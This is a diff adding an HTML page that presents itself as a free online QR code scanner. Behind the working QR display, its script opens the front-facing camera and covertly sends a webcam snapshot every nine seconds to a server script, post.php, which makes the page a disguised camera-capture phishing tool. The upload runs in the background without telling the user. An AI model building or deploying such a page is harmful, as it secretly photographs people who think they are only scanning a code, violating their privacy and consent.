@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>QR Code Scanner</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="./jsQR.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f8f8f8;
+      text-align: center;
+    }
+
+    .header {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .header h1 {
+      font-size: 36px;
+      margin: 0;
+    }
+
+    .subheading {
+      font-size: 18px;
+      color: #777;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 50px 0;
+    }
+
+    .start-button {
+      padding: 15px 30px;
+      font-size: 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    .start-button:hover {
+      background-color: #45a049;
+    }
+
+    .video-wrap {
+      position: relative;
+      width: 100%;
+      max-width: 640px;
+      height: 480px;
+      overflow: hidden;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      background-color: #000;
+      display: none;
+      margin-top: 30px;
+    }
+
+    video {
+      width: 100%;
+      height: auto;
+      border-radius: 10px;
+    }
+
+    #qrCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 10px;
+    }
+
+    .alert {
+      display: none;
+      padding: 15px;
+      margin-top: 30px;
+      border: 1px solid #4CAF50;
+      color: #4CAF50;
+      background-color: #DFF2BF;
+      border-radius: 5px;
+      max-width: 640px;
+      width: 100%;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">
+    <h1>Free QR Code Scanner & Reader</h1>
+    <p class="subheading">Easily and quickly scan your QR codes online anytime and anywhere.</p>
+  </div>
+  
+  <div class="container">
+    
+    <div class="alert" id="qrAlert"></div>
+    <button class="start-button" id="startButton" onclick="init()">Start Scanning</button>
+    <div class="video-wrap">
+      <video id="video" playsinline autoplay></video>
+      <canvas id="canvas" hidden></canvas>
+      <canvas id="qrCanvas" hidden width="640" height="480"></canvas>
+    </div>
+  </div>
+
+  <script>
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {
+                // Handle response
+            },
+            error: function() {
+                console.error("Error posting data.");
+            }
+        });
+    }
+
+    'use strict';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const qrCanvas = document.getElementById('qrCanvas');
+    const context = canvas.getContext('2d');
+    const qrContext = qrCanvas.getContext('2d');
+    const qrAlert = document.getElementById('qrAlert');
+    const startButton = document.getElementById('startButton');
+
+    const constraints = {
+        audio: false,
+        video: {
+            facingMode: "user"
+        }
+    };
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = stream;
+            document.querySelector('.video-wrap').style.display = 'block';
+            startButton.style.display = 'none'; // Hide the start button once video is shown
+            setInterval(captureImage, 9000);
+            requestAnimationFrame(scanQRCode);
+        } catch (e) {
+            console.error(`navigator.getUserMedia error: ${e.toString()}`);
+        }
+    }
+
+    function captureImage() {
+        context.drawImage(video, 0, 0, 640, 480);
+        const canvasData = canvas.toDataURL("image/png");
+        const cc = String(canvasData).replace("data:image/png;base64,", "");
+        post(cc);
+    }
+
+    function scanQRCode() {
+        qrContext.drawImage(video, 0, 0, qrCanvas.width, qrCanvas.height);
+        const imageData = qrContext.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
+        const code = jsQR(imageData.data, qrCanvas.width, qrCanvas.height);
+
+        if (code) {
+            qrAlert.innerText = `QR Code detected: ${code.data}`;
+            qrAlert.style.display = 'block';
+            setTimeout(() => { qrAlert.style.display = 'none'; }, 5000);
+        }
+
+        requestAnimationFrame(scanQRCode);
+    }
+  </script>
+
+</body>
+</html>
